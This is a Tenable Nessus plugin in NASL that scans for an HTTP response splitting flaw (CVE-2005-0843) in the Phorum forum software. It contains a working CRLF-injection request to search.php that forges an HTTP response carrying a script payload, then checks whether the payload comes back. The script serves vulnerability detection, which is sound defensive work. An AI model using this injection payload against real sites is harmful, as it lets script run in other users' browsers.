#
# (C) Tenable Network Security
#


if (description) {
  script_id(17596);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-0843");
  script_bugtraq_id(12869);

  name["english"] = "Phorum HTTP Response Splitting Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is prone to a
cross-site scripting attack. 

Description :

The version of Phorum installed on the remote host does not properly
sanitize input used in the Location response header.  An attacker can
exploit this flaw with a specially-crafted request to inject malicious
code into HTTP headers, which may allow execution of arbitrary HTML
and script code in a user's browser within the context of the remote
host. 

See also : 

http://www.securityfocus.com/archive/1/393953
http://www.phorum.org/story.php?48

Solution : 

Upgrade to Phorum 5.0.15 or later.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:H/Au:NR/C:N/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for HTTP response splitting vulnerability in Phorum";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  family["english"] = "CGI abuses : XSS";
  script_family(english:family["english"]);

  script_dependencies("phorum_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phorum"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # A vulnerable system will output a redirect along with the
  # "response" in its body.
  xss = "<html><script>alert('Nessus was here');</script></html>";
  # nb: the url-encoded version is what we need to pass in.
  exss = "%3Chtml%3E%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E%3C%2Fhtml%3E";
  req = http_get(
    item:string(
      dir, "/search.php?",
      "forum_id=0&",
      "search=1&",
      "match_forum=ALL&",
      "body=%0d%0a",
        "Content-Length:%200%0d%0a%0d%0a",
        "HTTP/1.0%20200%20OK%0d%0a",
        "Content-Type:%20text/html%0d%0a",
        "Content-Length:%20", strlen(xss), "%0d%0a",
        "%0d%0a",
        exss, "%0d%0a",
        "&",
      "match_type=ALL&",
      "author=1&",
      "match_dates=30",
      "subject=1&"
    ),
    port:port
  );

  soc = http_open_socket(port);
  if ( ! soc ) exit(1);
  send(socket:soc, data:req);
  res = http_recv_headers2(socket:soc);
  close(soc);

  # If we get back our text, there's a problem.
  if (res && xss >< res ) security_note(port);
}
